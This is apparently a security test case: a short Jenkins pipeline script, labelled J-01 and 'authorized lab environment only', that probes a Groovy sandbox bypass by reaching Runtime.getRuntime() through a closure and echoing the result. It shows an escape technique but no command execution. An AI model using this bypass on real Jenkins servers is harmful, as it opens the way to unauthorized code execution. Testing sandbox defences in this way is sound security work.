// Test: Jenkins Sandbox Bypass via Implicit Cast (J-01)
// Run in authorized lab environment only

pipeline {
    agent any
    stages {
        stage('Sandbox Test') {
            steps {
                script {
                    def dangerous = { -> Runtime.getRuntime() }
                    def result = dangerous.call()
                    echo "Runtime class accessed: ${result.getClass()}"
                }
            }
        }
    }
}
